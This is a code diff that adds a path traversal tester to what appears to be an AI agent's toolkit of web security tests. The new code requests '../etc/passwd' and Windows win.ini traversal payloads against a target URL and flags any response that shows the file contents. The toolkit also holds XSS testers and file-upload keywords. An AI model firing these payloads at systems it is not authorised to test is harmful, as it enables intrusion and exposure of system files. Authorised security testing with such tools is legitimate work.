@@ -18,6 +18,7 @@ from langchain_core.tools import Tool
 from report_generator import generate_report
 from exploit_tools.access_simulation import find_admin_panels
 from recon_tools.recon_modules import run_port_scan, run_subdomain_scan
+ 
 
 # -------- Utility -------- #
 def clean_domain(domain):
@@ -251,6 +252,28 @@ def run_dom_xss_test(url):
 
     except Exception as e:
         return f"❌ DOM XSS Test failed: {e}"
+    
+
+
+def run_path_traversal_test(url):
+    try:
+        payloads = [
+            "../../../../../../etc/passwd",
+            "../" * 8 + "etc/passwd",
+            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+        ]
+        findings = []
+        for p in payloads:
+            target = url + p
+            r = requests.get(target, timeout=5)
+            if "root:x:" in r.text or "[extensions]" in r.text:
+                findings.append(f"🚨 Path Traversal Found at: {target}")
+            else:
+                findings.append(f"❌ Not vulnerable at: {target}")
+        return "\n".join(findings)
+    except Exception as e:
+        return f"❌ Error: {e}"
+
 
 # -------- Tools List -------- #
 tools = [
@@ -276,7 +299,16 @@ tools = [
     name="DOM XSS Tester",
     func=run_dom_xss_test,
     description="Detects potential DOM-based XSS via URL hash payload injection"
+),
+
+Tool(
+    name="Path Traversal Tester",
+    func=run_path_traversal_test,
+    description="Test for directory traversal vulnerabilities by attempting to read OS-level files"
 )
+
+
+ 
 
 
 ]
@@ -299,7 +331,12 @@ tool_keywords = {
     "Stored XSS Tester": ["stored xss", "post xss", "xss form"],
     "DOM XSS Tester": [
     "dom xss", "dom-based xss", "fragment xss", "hash xss", "client-side xss"
-]
+    
+],
+"File Upload Tester": ["upload", "file upload", "php upload", "image hack"],
+"Path Traversal Tester": ["path", "directory traversal", "etc/passwd", "traversal"]
+
+
 
 
 
